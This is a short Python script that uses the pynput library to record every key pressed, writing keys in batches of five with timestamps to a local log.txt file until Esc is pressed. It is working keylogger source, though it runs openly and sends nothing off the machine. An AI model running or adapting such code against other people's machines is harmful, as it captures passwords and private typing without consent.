# C:\Users\Abhay>pip3 install pynput

import pynput
import datetime

from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global keys
    global count
    keys.append(key)
    count += 1

    if count >= 5:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    try:
        with open("log.txt", "a") as f:
            for key in keys:
                k = str(key).replace("'","")
                if k.find("space") > 0: 
                    f.write("\n")
                elif k.find("Key") == -1:            
                    f.write(k)
            f.write(' '+ str(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))+ ' ')
            f.write("\n")
    except FileNotFoundError:
        print("The log file could not be found.")
    except PermissionError:
        print("You do not have permission to write to the log file.")
    except:
        print("An error occurred while writing to the log file.")
        
def on_release(key):
    if key == Key.esc:
        return False
        
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
